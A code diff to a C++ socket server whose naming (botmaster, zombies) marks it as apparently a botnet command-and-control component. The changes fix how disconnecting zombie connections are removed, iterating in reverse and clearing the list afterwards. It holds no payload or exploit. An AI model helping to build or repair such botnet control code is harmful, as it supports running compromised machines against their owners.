@@ -166,7 +166,7 @@ bool Server::receive()
 	}
 	
 	m_ZombieBufs.clear();
-	m_ZombieDisconnects.clear();
+	//m_ZombieDisconnects.clear();	//getting cleared while disconnecting
 	for (int i = 0; i < m_Zombies.size(); i ++)
 	{
 		if (FD_ISSET(m_Zombies[i], &m_Readfds))
@@ -177,7 +177,7 @@ bool Server::receive()
 			if (received == SOCKET_ERROR)	//received == 0 means that the connection got closed gracefully
 			{
 				std::cout << "Zombie forces a disconnect" << std::endl;
-				m_ZombieDisconnects.push_back(i);	//store index in m_Zombies from clients who wants to disconnect
+				m_ZombieDisconnects.push_back(i);	//store index in m_Zombies from clients who wants to disconnect -> better performance dont need to iterate and compare socket descriptor
 			}
 			else if (received == 0)
 			{
@@ -222,13 +222,14 @@ void Server::closeConnections()
 		closesocket(m_Botmaster);
 		m_Botmaster = INVALID_SOCKET;
 	}
-	for (int i = 0; i < m_ZombieDisconnects.size(); i++)
+	for (int i = m_ZombieDisconnects.size() - 1; i >= 0; i--)
 	{
 		//WSAEventSelect(m_Zombies[m_ZombieDisconnects[i]], NewEvent, FD_CLOSE);
 		shutdown(m_Zombies[m_ZombieDisconnects[i]], SD_SEND);
 		closesocket(m_Zombies[m_ZombieDisconnects[i]]);
 		m_Zombies.erase(m_Zombies.begin() + m_ZombieDisconnects[i]);
+		//because the index stored in m_ZombieDisconnects would stay the same altough the index in m_Zombies gets reduced (erase)
 	}
-	
+		m_ZombieDisconnects.clear();
 	
 }
